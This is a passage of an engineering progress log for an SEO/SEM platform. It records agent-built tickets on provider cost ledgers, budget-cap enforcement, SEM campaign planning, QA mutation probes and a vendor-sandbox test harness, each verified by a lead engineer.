`SEMRUSH_PROVIDER_RESERVATION_FRACTION` / `AHREFS_PROVIDER_RESERVATION_FRACTION`. DataForSEO instead
takes a literal `DATAFORSEO_MONTHLY_CAP_USD` deposit-burn ceiling, default unset — correct, since it
is not a reservation of anything.

Verified at the code by me: `PROVIDER_MTD_QUERY_SQL` extends the global template with
`AND provider = $2`, mode filter stays parameterized as `$1`; the TTL cache is keyed
**`${providerKey}::${simulated}`** — both axes, so neither a different vendor nor a mode flip can
serve the wrong slot (the SM-33 lesson, applied without being told). **An unset cap means the
aggregate is never attempted at all** — stronger than skipping the tier in arithmetic.

New lint allowlist entry keyed on `argPattern: "companyIds"`, deliberately distinct from
`sumGlobalMonthToDate`'s `"ids"`, so SM-43's content-keyed scheme cannot absorb this second
cross-tenant call into the first entry's ratification. That is the scheme working as designed.

**Seven mutation probes, all caught:** degrade-to-0 → 2 red · mode predicate removed → 8 red (Postgres
also rejected the unbound `$1`) · provider predicate removed → 5 red · null-cap tier-skip removed →
`tsc` failed outright, then 22 red when forced through with a cast · provider tier dropped from the
cascade → 5 red · pre-lock "only attempt when configured" guard removed → **exactly 1** red (the test
built for it — precisely scoped, nothing over- or under-caught) · non-positive-price guard removed →
1 red.

### SM-17 — first UI onto the money ledger

`GET …/engagements/:id/ledger` → `{providerMode, costToServeUsd, currentModeRowCount,
simulatedHistoryExcludedUsd, rows[]}`. The binding language landed: **"Cost to serve (standard
rates)"**, the verbatim two-line cash legend, `status` rendered verbatim, no occurrence of "actual"
on any figure.

**The empty-vs-real-zero distinction is two separate code paths**, both unit-tested and both driven
live: `currentModeRowCount === 0` → "No provider calls recorded yet for the current period"; a genuine
zero (rows exist but all cache hits) → `$0.00`. Those are different claims and the surface no longer
conflates them.

Per-row chips come from **the row's own flag**, proven live: a historical `semrush` row badged
SIMULATED while the page-level mode read **Live**. Other-mode history appears only as a separate
labelled "history (excluded)" line, never blended.

It also confirmed unprompted that it renders `status`/`endpoint`/`provider` as raw strings with
fallbacks, so SM-40's brand-new `provider` tier and `provider_ceiling_unavailable` code cannot render
blank — checked against the already-updated `types.ts` rather than assumed.

### One fix by me — the rows and the KPI did not reconcile, and nothing said so

The KPI is month-to-date in the **current mode**; the table is the latest **200 calls across all
periods and both modes**. Correct by design, documented in the controller — but the table carried **no
caption**, so an operator would sum the visible rows, get a different number from the headline, and
reasonably conclude the ledger is broken. On a money surface that support ticket writes itself.

Added an explicit scope heading plus a one-line note that the list is not the basis of the figure
above. **An unlabelled figure that invites a false reconciliation states something untrue by
omission** — the same class as an unlabelled simulated number, which is the whole reason this surface
has prescribed wording. Re-verified: `tsc` clean, UI 604/604, `next build` green.

### Concurrency note worth keeping

SM-40 reported "355 tests" and so did SM-17, despite each adding tests — because they ran
concurrently and SM-40's final run already picked up SM-17's in-flight additions to `search.test.ts`.
End state is green and verified by me, but it means **a test count observed during concurrent work is
not attributable to one agent's diff**. Only the post-merge number means anything.

---

## 6o · SM-18 — SEM domain, cluster→plan generator, RSA + negative AI drafts (2026-07-29) · **AC discharged, gate owed**

*(Section letters were juggled twice while two agents appended concurrently; final order is 6o = SM-18, 6p = SM-42, matching file order. See
immediately below for the concurrency note. Content otherwise untouched.)*

Built concurrently alongside SM-42 (owns `providers/*`) — disjoint file ownership held, neither agent
touched the other's files. New: `sem-plan.ts` (pure cluster→plan generator), `sem-drafts.ts` (pure
RSA-draft + negative-classification prompt/parse), new routes on `search.controller.ts` (campaigns/
ad-groups/ads/negatives/change-proposals CRUD, `generate-plan`, `ads/:id/draft`, `negatives/propose`),
and `search-sem.test.ts`/`sem-plan.test.ts`/`sem-drafts.test.ts`. **No migration** — every column used
(including 0048's `metrics_provider`/`metrics_simulated`) already existed; `search.proposeNegatives`'s
existing mcpTool stub (index.ts) was firmed into a real binding (method/pathTemplate), no new tool
added (the design's §07 tool table names no other SEM-specific tool for this ticket).

**Cerbos:** every new route rides the ALREADY-LANDED `resource_search_campaign` policy (SM-03) —
`read`/`create`/`update`/`delete`/`propose_change` for baseline CRUD and change-proposal creation,
`update` again for the approve/dismiss transition (neither a live mutation, so the baseline tier is
correct per the policy's own header comment). No Cerbos policy change was needed; `search-cerbos.test.ts`
(25/25, unmodified) already covers this kind's full parity matrix including the member-denied-launch/
apply_manual/apply_negatives/set_budget/delete headline deny case, so it was RE-VERIFIED, not re-derived.

**No live side-effects (the ticket's own constraint), enforced at the app layer in four places:**
campaign `status` writable only as `draft|proposed`; ad `status` only as `draft|approved|rejected`;
negative `status` only as `proposed|approved|dismissed`; change-proposal `status` reachable only as
`proposed→approved|dismissed` — `applied`/`live` are refused (400) everywhere, naming the ticket that
owns them (SM-30/21/26/20). A mutation probe for each of these four guards is in `search-sem.test.ts`
(e.g. `PATCH change-proposals/:id {status:'applied'}` → 400; editing `payload` after `approved` → 400;
`approved→proposed` → 400; a dismissed proposal accepts no further transition).

**Provenance flow-through (§A2/§A4.7 standing rule):** `generateCampaignPlan` reads
`metrics_provider`/`metrics_simulated` directly off `search_keywords` (the first SEM-side reader of
those 0048 columns) and `sem-plan.ts`'s `buildCampaignPlan` computes a per-ad-group
`{providers: string[], simulatedCount, realCount, unpulledCount}` — providers listed distinctly (never
averaged), simulated/real counted separately, and a keyword with no metrics pulled yet counts as
`unpulled`, never coerced into 0 or "real". `search-sem.test.ts`'s plan-generator test hand-stamps one
cluster with a MIXED dataforseo(real)/semrush(simulated) provenance and one cluster entirely unpulled,
and asserts the exact breakdown; `sem-plan.test.ts` adds a dedicated mutation probe on the same
invariant at the pure-function level.

**AI drafts (RSA + negatives), both fail-soft, same contract as ai-drafts.ts:**
- RSA draft (`POST ad-groups/:id/ads/draft`) — ONE `completeViaGateway` call per request (never
  per-keyword, the SM-32 lesson), grounded in the ad group's own cluster keywords (bounded
  `MAX_RSA_KEYWORDS=30`). An AI response short of Google's own RSA minimums (3 headlines/2
  descriptions) is treated as unusable and falls back to a deterministic draft rather than persisting
  a half-built ad — pinned by a mutation-probe unit test.
- Negative-keyword proposal (`POST campaigns/:id/negatives/propose`) — ONE call over the WHOLE
  human-submitted term list (bounded `MAX_NEGATIVE_TERMS=200`; reuses SM-09's `parseKeywordImport`
  read-only for the `text` paste shape). `parseNegativesProposal` drops any candidate term the AI
  didn't receive (defense-in-depth, mirrors `ai-drafts.ts`'s known-codes guard) — proven live in
  `search-sem.test.ts` by having the mocked completion propose an extra, never-submitted term and
  asserting it never reaches a persisted row. **Deliberately EMPTY fallback** on a gateway outage
  (never a fabricated rule-based judgment) — the one place this ticket's AI-draft fallback differs
  from `ai-drafts.ts`'s triage/brief pattern, reasoned in `sem-drafts.ts`'s file header.

**Verification (personally observed, this session):**
- `npx tsc --noEmit` — clean.
- `npm run lint:withtenants` — clean (`scanned 116 files`); no new allowlist entries needed (every new
  query in this ticket is single-tenant, `withTenants([tenantId], ...)`).
- `TEST_DB_PREFIX=sm18` against live Postgres (55433) + live Cerbos (3592) + Redis (56380), per-file
  isolated databases (the harness is now per-file-physical-DB — SM-31's old shared-DB defect no
  longer applies, confirmed by running the whole `src/modules/search` directory in one invocation
  cleanly): **22 files / 407 tests, all green** — `search-sem.test.ts` 17, `sem-plan.test.ts` 11,
  `sem-drafts.test.ts` 13 (this ticket's 41 tests), plus 18 pre-existing files unaffected (366 tests),
  including `search-cerbos.test.ts` 25/25 and the concurrent SM-42 agent's `providers/{ahrefs,
  semrush,registry}.test.ts` running green alongside with no interference.
- Refusal coverage exercised directly: cross-tenant 404 on campaign/ad-group/ad/negative/
  change-proposal (both direct-by-id and nested-under-parent); malformed input → 400 never 500 on
  every new POST/PATCH (including a bare non-uuid path param, which would otherwise surface as an
  unhandled Postgres 22P02 → 500 — a `UUID_RE`/`assertUuid` guard new to this file, since no shared
  guard existed for this class of input before); zero partial writes confirmed after every rejected
  call via a follow-up list query.

**Not done, out of scope by the ticket's own text:** manual-apply export (SM-30), the dual-mode
picker UI and api-mode execution (SM-19/21/26), the live search-term sync (SM-20), metrics-daily
import/pacing math (SM-18's other half + SM-22), and `platform-ui` (explicitly not owned by this
ticket — the SEM console is SM-19).

**Owed:** QA gate (adversarial pass on the refusal/mutation-probe set) + architect review of the diff,
same as every other ⚡-adjacent ticket in this program.

---

## 6p · SM-42 — true-up seam (2026-07-29) · **DEV-VERIFIED; ⚡ gate owed with SM-40**

Verified by me: search suite **22 files / 407 tests green** (one invocation, `--maxWorkers=4`) ·
`tsc` clean · `lint:withtenants` clean (116 files).

### The seam

`SearchDataProvider` gains **one optional member**: `takeActualCostUsd?(): number | undefined`.
Optional is the right call — DataForSEO bills a flat published price (no correction is possible) and
every simulator's dollars are synthetic, so neither implements it and nothing about them changes.
Dispatch treats absence as "no correction available", **never as `$0`**. Deliberately *not* a
parameter threaded through `postSerpTasks`/`getKeywordMetrics`/etc., which would ripple through every
driver and call site.

### The concurrency hazard, fixed structurally rather than carefully

The pre-existing `ahrefs.ts` capture was a single instance field — last-write-wins, no notion of which
op a number belonged to, and no way to *sum* `getBacklinkSummary`'s two parallel calls. Replaced with
an **`AsyncLocalStorage`-scoped store**: `withActualCostCapture()` opens a fresh store per dispatch,
`recordActualCostUsd()` **adds** into the active store, `takeCapturedActualCostUsd()` reads-and-clears.
Two dispatches racing the same provider singleton get two independent stores — **by construction of
ALS, not by discipline**. That distinction is the whole value: a carefully-managed shared slot is one
careless edit from regressing, whereas this cannot be shared.

**Proved with genuinely racing tests, not sequential ones** — a sequential test passes against the
broken design, which is exactly how this class of bug survives review:
- `ahrefs.test.ts`: two captures raced via `Promise.all` on ONE provider instance with staggered
  internal delays (30ms vs 5ms) so the HTTP calls interleave; op A (10+20 units) and op B (40+5) each
  land on their own correct total.
- `dispatch.test.ts`: two full `dispatchProviderOp` calls raced against the same registered instance
  for different engagements, asserting the **ledger rows** true up to their own target's cost, never
  swapped.

### Both directions, atomically, and never re-deciding the budget

The `invokeProvider` call is wrapped in the capture; the `posted` row is inserted at the estimate as
before; then **in the same transaction** a new connection-scoped `trueUpLedgerOnConnection` moves
cost/status down *or* up. `trueUpLedger` now delegates to it, so its existing tests (same-row advance,
double true-up no-op, cross-tenant refusal) remain regression coverage of the same body.

**Budget arithmetic is never re-run** — the stop-loss decided pre-dispatch on the estimate, and
re-deciding after the money is spent would be both pointless and a new failure mode. Proven with a
neat test: an estimate ($0.01) clears a cap ($0.05) that the trued-up actual ($0.10) would alone
breach → the dispatch succeeds, and a *following* dispatch against the now-real MTD correctly refuses.
That isolates "the first success was the absence of a re-check" from "the re-check is broken".

**§A9.5 `items ≥ 1` alignment:** `Math.max(1, op.items ?? 1)` in all three live drivers' estimators,
matching the simulator. `items: 0` now prices as `items: 1`, never `$0` — a `$0` estimate on the money
path is the §4d class, since it cannot breach any cap.

**Three mutation probes, all caught:** reintroducing a post-true-up budget check → 1 red (exactly the
"never re-runs" test) · replacing the ALS store with a shared non-summing slot → **5 red** (both racing
tests plus the down/up/no-true-up ledger tests) · removing the `items` clamp → 3 red, exactly the three
targeted pins. All reverted, confirmed by re-reading the files.

### ⚠️ SM-17's "actual" prohibition is NOT liftable — and the nuance matters

The implementer checked rather than assuming, and was right: the prohibition stands until **both**
SM-42 (now landed) and **SM-41** (staging real-data reconciliation) exist. SM-41 has not landed.

**The nuance it added, which must not be lost:** even after SM-41, "actual" can only be true
**per-row, where a true-up genuinely fired — Ahrefs rows only.** Semrush has no confirmed true-up
signal and DataForSEO needs none, so their rows stay "cost to serve (standard rates)" permanently.
**The eventual wording change must be row-scoped, never a page-level flip.** A blanket "actual" label
over a table where two thirds of the rows were never corrected would be a new overclaim introduced by
the very ticket meant to remove one.

Left `search.controller.ts:579`'s comment untouched (it names "until SM-42's true-up", now half-stale)
because that file belongs to the concurrent SM-18 agent — correct call on ownership; it is a one-line
follow-up for whoever takes SM-41.

### Honest gaps

- `trueUpLedgerOnConnection` has no dedicated `ledger.test.ts` unit test beyond the pre-existing
  `trueUpLedger` tests that now share its body, plus exercise via `dispatch.test.ts`. Adequate, not
  independently pinned at the ledger layer.
- **Ahrefs's per-field unit costs remain unverified** against the exact `select=` list, so the estimate
  this true-up corrects *from* is still not proven an upper bound for Ahrefs. SM-41 settles it.

---

## 6q · Post-SM-18/42 verification + SM-47 (new ticket)

**Verified by me after both concurrent agents finished:** platform-nest **91 files / 1030 tests green
in ONE `npx vitest run --maxWorkers=4`** · `tsc` clean · `lint:withtenants` clean (116 files).
Section letters were juggled twice by concurrent appends; final order is 6o = SM-18, 6p = SM-42.

**Concurrency lesson, second instance:** SM-42 and SM-18 *both* reported "22 files / 407 tests"
because each run picked up the other's in-flight test files. Post-merge numbers are the only
attributable ones — noted again because it will keep happening while agents run in pairs.

### SM-47 · **NEW** — SEM console read surfaces — tier `senior-fe` · default

SM-18 landed ~20 SEM endpoints (campaigns / ad-groups / ads / negatives / change-proposals /
generate-plan / draft / propose-negatives) and **no UI reads any of them.** The SEO console's
Campaigns craft-group still renders `BackendPending`. Precedent is SM-12, which turned landed audit +
keyword data into real surfaces.

Scope: read + safe-write surfaces for SM-18's objects inside the existing `seo` toolkit's **Campaigns**
group — campaign list/detail, ad groups, ads, negatives, change proposals, and the plan generator's
output. **Explicitly NOT in scope:** anything that applies a change to a real ad account. SM-18 refuses
`applied` at the app layer; the UI must not imply otherwise. The dual-mode apply picker is SM-19,
manual export is SM-30 — name them in `BackendPending` the way the existing tabs do.

Inherits, binding:
- **Provenance flows through the plan** (§A2/§A4.7). `generateCampaignPlan` returns per-ad-group
  `{providers, simulatedCount, realCount, unpulledCount}`. A plan built from simulated volumes must
  **not** present as built from real ones: badge it, list providers **distinctly** (never blended), and
  keep `unpulled` visually distinct from both real and simulated — three states, not two.
- Money language per §A3/SM-17: "cost to serve (standard rates)"; **"actual" is forbidden** (SM-42
  landed but SM-41 has not; and even after it, "actual" is row-scoped to Ahrefs only — never a
  page-level flip).
- `—` never `0`; `status` verbatim; Cerbos-gated affordances hidden/disabled per `search:campaign:write`
  and `search:campaign:launch`.
- **Verify every field against `search.controller.ts`'s actual SELECT and response envelope** (§4i) —
  never against a demo fixture, never against the TypeScript interface.

---

## 6r · ⚡ QA gate — SM-40 + SM-42 + SM-18 · **ALL PASS**; one finding whose FIX was wrong

Chain-gated (shared money/provider surface). QA-observed **23 files / 417 tests**; after my fix,
verified by me: **24 files / 428 tests green** · `tsc` clean · `lint:withtenants` clean (117 files).
QA added `providers/qa-adversarial-sm40-42-18.test.ts` (10 tests, test-only per this round's policy).

**SM-42 and SM-18 held under every attack.** SM-42: a provider throwing mid-capture leaks nothing
into the next dispatch; double-take returns once then `undefined`; parallel calls inside one op sum
(7+3=10) rather than last-write-wins. SM-18: all four status whitelists are exact-match `Set.has()`,
so `"Applied"`/`"APPLIED"`/`"applied "`/`["applied"]`/a crafted `toString` all 400 rather than
normalizing; **create** routes carry the same guard as PATCH (a PATCH-only guard would have been a
bypass); `applied` is unreachable as a from-state; **25 SEM routes, 25 `authorize()` calls, 1:1**, and
27 `assertUuid` sites cover every id-bearing handler so a malformed param 400s uniformly rather than
surfacing as a Postgres `22P02` 500. Provenance verified against a hand-stamped mixed fixture:
`providers` distinct and sorted, real/simulated/unpulled counts summing to the total, `providers: []`
for all-unpulled rather than an invented vendor — and confirmed the controller's `generate-plan`
handler genuinely SELECTs `metrics_provider, metrics_simulated`.

### The finding — and why its proposed fix would not have worked

`Number("50 usd")` is NaN; NaN is not `== null`; so `evaluateBudget` **entered** the provider tier and
then every comparison against it was false by IEEE-754 — no breach, no warning, for a $1e9 estimate
against $0 spent. A tier that looks configured and enforces nothing: this program's most-repeated
class (§4d, §6d, §6f, §6k), now a fifth time. QA also correctly identified the **asymmetry** that hid
it: Semrush/Ahrefs reach their caps through `computeProviderReservationCapUsd`, whose `!(price > 0)`
guard already neutralizes a malformed value, while DataForSEO's cap was a raw
`process.env.X ? Number(...) : null`.

**Its proposed remedy was to coerce the NaN to `null` so the tier is skipped. I implemented that,
then my own mutation probe failed it: 58/58 still green with the guard deleted.** Working out why is
the substance of this entry: **an inert NaN tier and a skipped null tier enforce exactly the same
nothing.** Verified directly (`projected > NaN` false, `projected >= ratio * NaN` false). Coercion
changes no behaviour whatsoever — it only relocates the silence.

So the hazard was never the arithmetic. It is **silent misconfiguration**: an operator sets a spend
ceiling, believes it is enforced, and it is not. `null` is the honest encoding of "no cap configured";
a typo is not that, it is a deployment error. And nothing downstream of the parse can tell those two
apart — which means the parse site is the only place the distinction still exists.

**Fixed there:** `config.ts`'s new `moneyEnv()` returns `null` when unset (deliberate skip, unchanged
behaviour) and **THROWS at boot** when set-but-uninterpretable, naming the variable. Consistent with
every other guard on this path (pillar, scope, ceiling-unavailable, provider capability) failing
closed: a boot failure is loud, immediate and cheap; an unenforced ceiling is silent and is discovered
by the invoice. Whitespace-only is treated as **unset**, not malformed, so a blank compose row cannot
brick a boot.

**Pinned by `src/config-money-env.test.ts` (9 tests) — and mutation-probed: 6 of 9 fail with the
guard removed**, `config.ts` restored byte-identical afterwards. Cases: `"50 usd"`, `"abc"`, `"0"`,
`"-10"`, `"Infinity"`, `"-"` all refuse to boot; unset and whitespace skip; `"50"` parses.

The `!Number.isFinite(t.cap)` line added to `evaluateBudget` is kept but **documented as clarity, not
enforcement** — deleting it breaks nothing, which is precisely why it cannot be the defence. Its only
real effect is keeping a NaN out of a warning payload, so no operator is shown "$NaN".

**My first test attempt is recorded rather than deleted**, because the mistake is instructive: it
asserted "some other tier still catches it", which passes with or without the guard — a test that
tests nothing, the exact sin three gates in this module have caught elsewhere. QA's own test was
retitled (assertions untouched) so it no longer reads as an open defect while still documenting the
true property: `evaluateBudget` cannot defend a NaN cap, and no longer has to.

**Lesson, the sharpest one this program has produced:** a correct diagnosis does not imply a correct
remedy. The finding was real, the mechanism was described accurately, and the proposed fix was inert —
and only a mutation probe on the fix itself exposed that. **Verify the fix the way you verify the
bug.**

---

## 6s · SM-14 — rank tracking · **AC MOSTLY DISCHARGED, live-proven; two agent faults, finished by me**

Its agent was killed **twice** by API/stream faults (unrelated to the work). Substantial output
survived intact each time — `rank.ts` (15.6KB), `rank.test.ts` (16 pure-unit tests green), three
routes wired, no migration needed (0048 already had the columns), `tsc` clean. Rather than resume a
third time I took over the highest-value remainder: **the live end-to-end proof.**

### THE PIPELINE IS NO LONGER TEST-ONLY — first real traffic through `dispatchProviderOp`

Rebuilt + recreated `platform` (both compose files; `:3004` still published), marked 3 seeded keywords
tracked, captured the before-state (**0 ledger rows, 0 snapshots**), then drove two live pulls.

`POST engagements/:id/rank-pull` → `attempted:3, pulled:3, skipped:0, failed:0`, each result carrying
`provider:"dataforseo", simulated:true`.
`POST keyword-sets/:id/metrics-pull` → `attempted:13, updated:13, absent:0, failed:0`, each carrying
`provider:"semrush", simulated:true`.

Database after (real rows, not fixtures):

```
search_rank_snapshots : 3 rows, 3 simulated=true
search_keywords       : 25 rows, all metrics_provider='semrush', metrics_simulated=true,
                        volumes 250–10000 (a plausible spread, not a constant)
search_provider_calls : dataforseo.serp  ×3  $0.001800  all simulated
                        semrush.volume   ×13 $1.299870  all simulated
```

**SM-36's per-capability routing is now proven in live traffic, not just in tests** — serp billed to
DataForSEO, volume billed to Semrush, exactly as §A2 assigns. **AC 2 (the SM-36 carried-forward
clause) is discharged**: the metrics writer stamps provider + simulated atomically with the values.

*Evidence limitation, stated:* all 25 keywords read `semrush` because I had backfilled the 12
un-pulled ones during SM-46c, so the 13 genuinely-stamped rows are not distinguishable from the
backfilled ones by provider alone — they are distinguishable by their **changed volumes** (the seed
wrote 310–2800; the pull wrote 250–10000).

### `status='posted'` is correct, not a defect

All three SERP ledger rows sit at `posted`. That is dispatch.ts:114's documented design — `completed`
means a cache hit or a row SM-42 trued up, and DataForSEO has no true-up signal (flat published
price), so its rows legitimately remain `posted` at the estimate. Checked before reporting it as a
finding, because "status looks pending" is exactly the sort of thing that gets mis-filed as a bug.

### ⚠️ Real gap found by the live run — **SM-48**, and rank tracking is undemonstrable until it lands

Every snapshot came back `position: null` — the tracked property never ranks. Not a bug in `rank.ts`
(its `findPropertyPosition` correctly scans the SERP for the domain and `null` is 0034's documented
"not found in this SERP"). The gap is in **the simulator**: `serpFor()` builds its candidate pool from
well-known site lists plus keyword-derived `*.example.com` brand domains, and **has no knowledge of
any tenant's property domain**, so `balibeach.test` can never appear at any position.

SM-33's spec explicitly promised "**SERP with the tracked property placed at a stable position**".
That clause was never met, and nothing caught it because SM-33's tests assert SERP *shape* — it only
became visible when SM-14 became the first consumer. **Consequence: in the only mode dev runs in, rank
tracking always reports "not ranking", so the feature cannot be demonstrated at all.**

**⚠️ Do NOT fix this by injecting the property domain into the SERP per request.** A SERP is shared
market data (D-4) and `search_data_cache` is deliberately no-RLS so one client's paid pull serves
every other client — that cross-tenant reuse *is* the cost model. Writing a property-specific SERP
into that cache would make tenant A's domain appear in tenant B's cached results: a cross-tenant data
leak introduced by a convenience. It is also unrealistic — in reality a SERP is identical for
everyone and the position is *derived* by scanning it, which is what `rank.ts` already does correctly.

**Recommended shape (SM-48, tier `medior`):** give the simulator a **platform-level, tenant-agnostic**
portfolio domain list from config (e.g. `SEARCH_SIMULATION_PORTFOLIO_DOMAINS=balibeach.test`), folded
into the candidate pool with the existing deterministic keyword×domain scoring. The pool then stays
identical for every caller — so the cache remains genuinely shared and no tenant-specific data enters
it — while the demo property ranks at a stable, reproducible position. Must be simulate-mode only and
must never touch the live drivers.

### Still owed on SM-14

The DB-backed integration test file its agent was starting when the second fault hit (the unit tests
and the live proof both stand); the mutation probes on the `simulated` stamp — in particular the pin
that substituting `config.search.providerMode` for `DispatchResult.simulated` must turn a test red,
which is the subtle bug AC 1 exists to prevent; AC 4's `listKeywords` SELECT widening plus BFF
types/fixtures; and the ⚡ gate. Not claimed as discharged.

---

## 6t · SM-47 — SEM console read surfaces · **DEV-VERIFIED**

Verified by me: `tsc` clean · UI **64 files / 623 tests green** (baseline 63/604 → +1 file, +19 tests,
zero regressions) · `next build` green with `/departments/[deptId]/planner` and
`planner/[campaignId]` both in the manifest · forbidden-wording grep clean (only test assertions and
one comment documenting the deliberate absence).

The SEM division is now visible: campaign list + generate-plan, campaign detail, ad groups, ads
(manual + AI RSA draft), negatives (manual + AI classify), change proposals (create/approve/dismiss).
Its agent survived one API fault and resumed; the priority instruction was honoured — campaign
list/detail with provenance landed first and is the most heavily verified.

### The §4i discipline paid off three times, and the third is the important one

1. Campaign/ad-group/ad/negative/proposal SELECTs carry `created_at`/`updated_at` **unaliased**
   (snake_case), unlike this module's camelCase convention elsewhere. Typed as they actually arrive,
   with a header note so a future reader does not "correct" them back and silently break the fields.
2. `budget_minor`/`target_cpa_minor` are `bigint` and **uncast** by the controller, and the repo
   registers no `pg.types` parser for OID 20 (verified by grep) — so they arrive as **strings**.
   Typed `string | number | null` and coerced before formatting. This is the same class as the
   `numeric`-as-string crash that the SM-11 architect review caught (`.toFixed is not a function`);
   caught this time before it shipped rather than after.
3. **It confirmed that `GET campaigns/:id/ad-groups` does NOT return provenance, and refused to
   fabricate it.** Only the `generate-plan` response carries `{providers, simulatedCount, realCount,
   unpulledCount}`. So `AdGroupsPanel` shows name/cluster only. Inventing a provenance display on the
   persisted read — the obvious "consistency" improvement — would have produced exactly the §4i bug:
   a field the backend never sends, read as `undefined`, rendered as a confident wrong answer. The
   restraint is the correct call.

### Provenance rendering and the apply-affordance ban

Three states are **always visible** (a real zero renders `0`, never hidden) — real / simulated /
unpulled — with providers as **separate chips**, never joined into one string, reusing SM-38's
`SimulatedBadge`/`ProviderLabel` rather than a second badge set. Browser-verified with a live
"Generate plan" click producing a mixed dataforseo(real) + ahrefs(simulated) + unpulled breakdown
across three ad groups.

`ChangeProposalsPanel` states in the UI that approving or dismissing never reaches a live account and
names SM-19/SM-30/SM-21. Server actions gate on `search.manage` and **never** call
`search.campaign.launch`. No "Apply"/"Push to Google Ads" affordance exists anywhere.

### One anomaly chased rather than waved off

7–8 React hydration-mismatch warnings appeared on **first-ever** hits to the new routes under
`next dev`. It investigated instead of dismissing: isolated re-runs of the identical navigation
reproduced **zero** warnings once a route had been compiled in that dev-server process, including on
pre-existing pages using the same inline-style pattern, and `next build` (which pre-compiles, so the
race cannot occur) is clean. Attributed to a `next dev` first-compile timing artifact, **flagged not
asserted** — first place to look if it recurs post-merge.

---

## 6u · Vendor-sandbox provenance ruling + SM-49 (2026-07-29, architect)

*(Section letter: §6a–§6t are all taken; after two prior collisions — the §6j→§6k renumber and the
§6o/§6p juggle recorded in §6q — **§6u** is the next free letter and this section claims it.)*

**The ruling, in one line (full reasoning is addendum §A10, binding):** the vendor sandbox — a
local HTTP server speaking the three vendors' envelopes so the LIVE drivers run their real HTTP
path pre-staging — is a **test-harness fixture, never a deployable environment**. It runs
in-process on `127.0.0.1:0` inside test files, against **per-file throwaway test databases only**.

- **Provenance:** the `simulated` boolean keeps its single meaning. Sandbox-fed rows stamp
  `simulated = false` and that is *correct* — a faithful staging rehearsal — because the invariant
  is about **audience, not label**: *`simulated = false` rows may exist only (i) where real vendor
  credentials exist, or (ii) in throwaway per-file test DBs.* The sandbox may only produce (ii).
  Option (a) (stamp `true`) rejected — it dismantles §A4.3's branch purity or puts URL-sniffing on
  the money path, and dilutes SM-33's determinism/rate-table promise. Option (b) (third provenance
  value) rejected — no consumer exists; every ratified decision is binary; it re-opens every
  mode-filtered WHERE on the money path for zero decision value (§A10.2).
- **No `sandbox` value for `SEARCH_PROVIDER_MODE`** (§A10.3). The mode selects what boot registers
  in a deployment; the harness bypasses `main.ts` and calls the factories directly. §A4.3 survives
  byte-for-byte.
- **What it proves / cannot prove** (§A10.5): proves OUR mechanics (socket-level auth/encoding,
  timeout aborts, the 40602 poll as a real state machine, ALS true-up under real concurrent HTTP,
  full-chain composition, strict request validation). Cannot prove vendor facts — envelope
  fidelity, error-code inventory, the true-up header as actually sent, per-field billing units,
  plan gating, 429 behaviour, ledger-vs-console reconciliation. **A green sandbox is a validated
  client of our own vendor model, not a validated integration.** OQ-9/10/11 unchanged.
- **SM-41 scope UNCHANGED** — no clause moves; it gains SM-49 as prerequisite, a fixture-backport
  closing clause, and a capture duty (one redacted real envelope per vendor per capability into
  the fixture dir) (§A10.7). Its *risk profile* changes: staging failures should triage to "wrong
  vendor fact", not "broken plumbing".
- **Recorded replay** (§A10.6): designed toward now at zero extra ticket cost — the sandbox is
  fixture-FILE-driven from day one, so SM-41's recorded envelopes drop in without code change.

### SM-49 · **NEW** — vendor-envelope sandbox harness — tier `senior-be` · default · TODO

No Opus: the three protocols are already encoded in landed unit tests (`dataforseo.test.ts` /
`semrush.test.ts` / `ahrefs.test.ts`), the hazardous decision (provenance) is settled above rather
than delegated, and the boot guard is lexical + boot-time. Deps: SM-33/34/35/40/42 (all landed).
**Must land before SM-41** (its whole point). Ordering: any time from now; supersedes §6j's build
order in one respect — **step 6 (SM-41) gains SM-49 as a predecessor**. Blessed concurrency
(1–2 cap, disjoint files): SM-49 ∥ SM-15 *or* SM-49 ∥ SM-16 *or* SM-49 ∥ SM-14's remainder —
any ONE pair; SM-49 touches no controller, no snapshot writer, no n8n JSON.

**File ownership:** NEW `platform-nest/src/testing/vendor-sandbox/` (server + `fixtures/**`) —
deliberately OUTSIDE `src/modules/search/` so §6e's egress-inventory set-equality pin stays
byte-identical; NEW `src/modules/search/providers/*sandbox*.test.ts` integration files; `main.ts`
(boot guard only) + a small pure predicate module for it + `.env.example` rows. **Nothing else.**
Driver files only for defects the harness exposes, each with its own named regression test —
never for harness accommodation.

**AC (each independently checkable):**
1. **Harness shape:** in-process HTTP server on `127.0.0.1`, port `0` (ephemeral), fresh instance
   per test file, torn down in `afterAll`. Grep-provable: no compose/Dockerfile change, no import
   of the sandbox module from any non-test file, `main.ts` never references it.
   `egress-inventory.test.ts` remains **unchanged and green**.
2. **Real factories, real registration:** drivers built via the zero-arg
   `create*ProviderFromConfig()` with `config.search.{dataforseo,semrush,ahrefs}` mutated
   (fake creds, positive plan rates, `baseUrl` → sandbox origin) in `try/finally` restore (SM-46e
   pattern). Per vendor: factory returns a driver, it registers, and `dispatchProviderOp` serves a
   pull through it against a per-file test DB (§0 protocol). DFS direct construction is permitted
   ONLY for multi-poll tests to inject `sleepImpl`/short `pollIntervalMs`, all other options
   byte-matched to the factory's.
3. **Rehearsal fidelity pinned:** the harness asserts `config.search.providerMode === "live"` and
   `isSimulatedProvider(driver) === false` before dispatching — the rows it mints MUST stamp
   `simulated = false`, and a test asserts exactly that on the ledger row, plus provider key and
   estimate per the configured rate tables. (This is the staging rehearsal; a `true` here means
   the harness is not testing what SM-41 will run.)
4. **Full chain per advertised capability per vendor** (§A2 matrix): parse succeeds from real
   bytes; ledger row written; cache row written; a second identical dispatch is a cache hit with
   **zero** new sandbox requests (sandbox keeps a per-route hit counter the test reads).
5. **DFS Standard queue as a state machine:** `task_post` → `task_get` returns 40602 at least
   twice (sandbox holds task state) → 20000 with payload; test asserts poll count ≥ 2 from the
   sandbox counter and a successful ledger row. Also: the never-ready path (40602 forever) ends in
   the driver's existing timeout/refusal, surfaced as a typed error + ledger failure **per current
   dispatch semantics, pinned as-is, not redesigned**. Also: `queue: "live"` exercises the
   `/live` endpoints.
6. **Auth strictness, per vendor scheme:** the sandbox refuses wrong/missing auth (DFS Basic,
   Semrush `key` query param, Ahrefs Bearer) in vendor shape; one positive test per vendor proves
   the driver's real serialized auth is accepted; one negative test per vendor (wrong creds)
   surfaces a typed failure through dispatch.
7. **Vendor-error-inside-200:** DFS `40501`/`40401`-class fixtures → typed refusal + ledger
   failure row; equivalent per-vendor error fixtures for Semrush (`ERROR ::`-style body) and
   Ahrefs (error JSON), matching what the drivers already parse.
